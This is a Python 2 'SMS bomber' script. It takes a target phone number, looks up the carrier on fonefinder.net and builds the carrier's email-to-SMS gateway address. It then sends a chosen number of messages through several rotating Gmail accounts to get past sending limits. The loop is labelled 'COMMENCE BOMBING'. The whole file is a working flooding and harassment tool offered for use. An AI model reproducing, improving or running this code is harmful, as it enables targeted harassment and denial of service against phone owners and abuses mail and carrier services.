#!/usr/bin/env python
import mechanize
import cookielib
from BeautifulSoup import BeautifulSoup
import html2text
import re
import string
import smtplib
import mimetypes
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.Utils import COMMASPACE, formatdate
from email import Encoders
import getpass

import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import os
import getopt

# Must do:
# easy_install BeautifulSoup html2text mechanize

# Parse command line
from optparse import OptionParser

usage = "usage: %prog [options] arg"
parser = OptionParser()
parser.add_option("-n", "--number", dest="number", help="Target Phone Number")
parser.add_option("-m", "--message", dest="message", help="SMS Body to send")
parser.add_option("-s", "--subject", dest="subject", help="SMS subject to send")
parser.add_option("-c", "--carrier", dest="carrier", help="Target number's Cellular Provider")
parser.add_option("-q", "--quantity", dest="quantity", help="Quantity of SMSs to send")
# For help, put in -h or --help as this is automatically added by optparse

(options, args) = parser.parse_args()

'''
   SETUP YOUR GMAIL ADDRESSES / PASSWORDS to be used for sending messages
   NOTE: The recipients do see the email address names
'''
gmails = {
    # 'user19': 'mypasshere', # Use this format, for a gmail with username "user19" and pass "mypasshere"
    # ADD MORE GMAILS HERE FOR INCREASED SENDING POWER
}

# Capture Target Cell Phone #
phonenum = options.number or raw_input('[>] Enter Phone # [FORMAT=0001112222]: ')

print "[+] Using number ", phonenum
# Browser
br = mechanize.Browser()

# Cookie Jar
cj = cookielib.LWPCookieJar()
br.set_cookiejar(cj)

# Browser options
br.set_handle_equiv(True)
br.set_handle_gzip(False)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# Follows refresh 0 but not hangs on refresh > 0
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

# User-Agent (this is cheating, ok?)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

# The site we will navigate into, handling it's session
br.open("http://fonefinder.net")

# Select the first (index zero) form
br.select_form(nr=0)

# Input the info
br.form['npa'] = phonenum[:3]
br.form['nxx'] = phonenum[3:6]
br.form['thoublock'] = phonenum[6]

# Find Data
br.submit()

# Process Data
html = br.response().read()
soup = BeautifulSoup(html)

# Remove HTML Tags
text_parts = soup.findAll(text=True)
text = ' '.join(text_parts)

# Regex Applicable Data
prov_name = re.findall('[0-9]+ [0-9]+ \w+ \w+ \w+.+PROV', text)

# Convert List to String
L = [str(x) for x in prov_name]
s = string.join(L,' ')

# Display Server Feedback
print "[ ] FoneFinder Server Feedback: " + s


# Provider Selection Menu
phoneHash = {
  "1": "Teleflip",
  "2": "Alltel",
  "3": "Ameritech",
  "4": "ATT Wireless",
  "5": "Bellsouth",
  "6": "Boost",
  "7": "CellularOne",
  "8": "CellularOne MMS",
  "9": "Cingular",
  "10": "Edge Wireless",
  "11": "S PCS",
  "12": "T-Mobile",
  "13": "Metro PCS",
  "14": "Nextel",
  "15": "O2",
  "16": "Orange",
  "17": "Qwest",
  "18": "Rogers Wireless",
  "19": "Telus Mobility",
  "20": "US Cellular",
  "21": "Verizon",
  "22": "Virgin Mobile",
  "23": "Google Voice",
}



if options.carrier:
    foundprov = options.carrier
else:
    for key, value in phoneHash.iteritems():
        print "   " + key + ": " + value
    print "\n[+] Please determine the phone carrier for this number."
    print "[ ] Visit http://www.freecarrierlookup.com and determine which carrier this number uses."
    foundprov = input("[>] TYPE CORRESPONDING NUMBER FROM ABOVE: ")



provider = [
    "teleflip.com",
    "message.alltel.com",
    "paging.acswireless.com",
    "txt.att.net",
    "bellsouth.cl",
    "myboostmobile.com",
    "mobile.celloneusa.com",
    "mms.uscc.net",
    "mobile.mycingular.com",
    "sms.edgewireless.com",
    "messaging.sprintpcs.com",
    "tmomail.net",
    "mymetropcs.com",
    "messaging.nextel.com",
    "mobile.celloneusa.com",
    "mobile.celloneusa.com",
    "qwestmp.com",
    "pcs.rogers.com",
    "msg.telus.com",
    "email.uscc.net",
    "vtext.com",
    "vmobl.com",
    "txt.voice.google.com",
]

sms_email = str(phonenum + "@" + provider[int(foundprov) - 1])

print
print "[+] Determined SMS Recipient Address : " + sms_email

email_qty = int(options.quantity or raw_input("[>] Enter Quantity to send: "))


# Utility function to send mail
def mail(to, gmail_user, gmail_pwd, subject, text):
   msg = MIMEMultipart()

   msg['From'] = gmail_user
   msg['To'] = to
   msg['Subject'] = subject

   msg.attach(MIMEText(text))

   part = MIMEBase('application', 'octet-stream')
   Encoders.encode_base64(part)

   mailServer = smtplib.SMTP("smtp.gmail.com", 587)
   mailServer.ehlo()
   mailServer.starttls()
   mailServer.ehlo()
   mailServer.login(gmail_user, gmail_pwd)
   mailServer.sendmail(gmail_user, to, msg.as_string())
   # Should be mailServer.quit(), but that crashes...
   mailServer.close()

# Iterate through messages? Feature to add at some point
email_subj = options.subject is not None or raw_input("[>] Enter Subject: ")
email_body = options.message or raw_input("[>] Type message body [enter to quit]: ")


print '[+] Starting...'
count = 1

# COMMENCE BOMBING
while count <= email_qty:
  # Iterate through the gmail accounts
  gmails_len = len(gmails)
  cur_g_index = count % gmails_len

  # SEND
  mail(sms_email, gmails.keys()[cur_g_index], gmails.values()[cur_g_index], email_subj, email_body)
  print "[+] ", count, " messages sent..."
  count += 1


print "[+] FINISHED sending", count, "messages."

